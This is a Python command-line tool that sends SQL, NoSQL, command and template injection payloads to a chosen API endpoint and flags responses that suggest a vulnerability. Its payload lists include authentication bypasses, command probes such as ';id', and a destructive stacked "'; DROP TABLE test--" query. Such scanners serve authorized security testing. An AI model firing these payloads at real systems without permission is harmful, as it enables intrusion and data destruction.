#!/usr/bin/env python3
"""Test APIs for injection vulnerabilities (SQLi, NoSQLi, command, SSTI).

Usage:
    python agent.py --url https://target.com/api/search --token TOKEN --sqli
    python agent.py --url https://target.com/api/login --token TOKEN --nosqli
    python agent.py --url https://target.com/api/export --token TOKEN --cmdi
    python agent.py --url https://target.com/api/render --token TOKEN --ssti
"""

import argparse
import json
import subprocess
from typing import Any

SQLI_PAYLOADS: list[dict[str, str]] = [
    {"label": "or_true", "value": "' OR 1=1--"},
    {"label": "union_select", "value": "' UNION SELECT NULL,NULL--"},
    {"label": "time_blind", "value": "' AND SLEEP(3)--"},
    {"label": "error_based", "value": "' AND 1=CONVERT(int,(SELECT @@version))--"},
    {"label": "stacked", "value": "'; DROP TABLE test--"},
]

NOSQLI_PAYLOADS: list[dict[str, Any]] = [
    {"label": "gt_bypass", "payload": {"$gt": ""}},
    {"label": "ne_bypass", "payload": {"$ne": "invalid"}},
    {"label": "regex", "payload": {"$regex": ".*"}},
    {"label": "where_js", "payload": {"$where": "1==1"}},
]

CMDI_PAYLOADS: list[dict[str, str]] = [
    {"label": "semicolon", "value": ";id"},
    {"label": "pipe", "value": "|id"},
    {"label": "backtick", "value": "`id`"},
    {"label": "dollar_paren", "value": "$(id)"},
    {"label": "newline", "value": "\nid"},
]

SSTI_PAYLOADS: list[dict[str, str]] = [
    {"label": "jinja2", "value": "{{7*7}}", "indicator": "49"},
    {"label": "twig", "value": "{{7*'7'}}", "indicator": "7777777"},
    {"label": "freemarker", "value": "${7*7}", "indicator": "49"},
    {"label": "erb", "value": "<%= 7*7 %>", "indicator": "49"},
]


def send_test(
    url: str, token: str, field: str, value: Any, method: str = "POST"
) -> dict[str, Any]:
    """Send a test payload and capture response."""
    if isinstance(value, dict):
        payload = json.dumps({field: value})
    else:
        payload = json.dumps({field: value})
    cmd = [
        "curl",
        "-s",
        "-w",
        "\n---HTTP_CODE:%{http_code}---TIME:%{time_total}",
        "-X",
        method,
        "-H",
        "Content-Type: application/json",
        "-H",
        f"Authorization: Bearer {token}",
        "-d",
        payload,
        url,
    ]
    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=15)
        output = result.stdout
        body = (
            output.rsplit("\n---HTTP_CODE:", 1)[0]
            if "---HTTP_CODE:" in output
            else output
        )
        meta = (
            output.rsplit("\n---HTTP_CODE:", 1)[1]
            if "---HTTP_CODE:" in output
            else "0---TIME:0"
        )
        parts = meta.split("---TIME:")
        status = int(parts[0]) if parts else 0
        elapsed = float(parts[1]) if len(parts) > 1 else 0
        return {
            "status": status,
            "body_preview": body[:300],
            "response_time": round(elapsed, 3),
        }
    except (subprocess.TimeoutExpired, ValueError):
        return {"error": "timeout"}


def test_sqli(url: str, token: str, field: str) -> dict[str, Any]:
    """Test SQL injection payloads."""
    findings: list[dict[str, Any]] = []
    for p in SQLI_PAYLOADS:
        resp = send_test(url, token, field, p["value"])
        suspicious = (
            resp.get("response_time", 0) > 3
            or "sql" in resp.get("body_preview", "").lower()
            or "syntax" in resp.get("body_preview", "").lower()
            or resp.get("status") == 500
        )
        findings.append({"test": p["label"], "suspicious": suspicious, **resp})
    return {"status": "ok", "test": "sqli", "findings": findings}


def test_nosqli(url: str, token: str, field: str) -> dict[str, Any]:
    """Test NoSQL injection payloads."""
    findings: list[dict[str, Any]] = []
    for p in NOSQLI_PAYLOADS:
        resp = send_test(url, token, field, p["payload"])
        suspicious = resp.get("status") in (200, 201)
        findings.append({"test": p["label"], "suspicious": suspicious, **resp})
    return {"status": "ok", "test": "nosqli", "findings": findings}


def test_cmdi(url: str, token: str, field: str) -> dict[str, Any]:
    """Test command injection payloads."""
    findings: list[dict[str, Any]] = []
    for p in CMDI_PAYLOADS:
        resp = send_test(url, token, field, f"test{p['value']}")
        suspicious = (
            "uid=" in resp.get("body_preview", "") or resp.get("response_time", 0) > 5
        )
        findings.append({"test": p["label"], "suspicious": suspicious, **resp})
    return {"status": "ok", "test": "cmdi", "findings": findings}


def test_ssti(url: str, token: str, field: str) -> dict[str, Any]:
    """Test server-side template injection payloads."""
    findings: list[dict[str, Any]] = []
    for p in SSTI_PAYLOADS:
        resp = send_test(url, token, field, p["value"])
        indicator = p.get("indicator", "")
        confirmed = indicator in resp.get("body_preview", "")
        findings.append({"test": p["label"], "confirmed": confirmed, **resp})
    return {"status": "ok", "test": "ssti", "findings": findings}


def main() -> None:
    parser = argparse.ArgumentParser(description="API injection tester")
    parser.add_argument("--url", required=True, help="Target API endpoint")
    parser.add_argument("--token", default="", help="Authorization token")
    parser.add_argument("--field", default="query", help="Field name to inject into")
    parser.add_argument("--sqli", action="store_true", help="Test SQL injection")
    parser.add_argument("--nosqli", action="store_true", help="Test NoSQL injection")
    parser.add_argument("--cmdi", action="store_true", help="Test command injection")
    parser.add_argument("--ssti", action="store_true", help="Test template injection")
    parser.add_argument(
        "--format",
        choices=["json", "text"],
        default="json",
        help="Output format",
    )
    args = parser.parse_args()

    if args.sqli:
        result = test_sqli(args.url, args.token, args.field)
    elif args.nosqli:
        result = test_nosqli(args.url, args.token, args.field)
    elif args.cmdi:
        result = test_cmdi(args.url, args.token, args.field)
    elif args.ssti:
        result = test_ssti(args.url, args.token, args.field)
    else:
        result = test_sqli(args.url, args.token, args.field)

    print(json.dumps(result, indent=2))


if __name__ == "__main__":
    main()
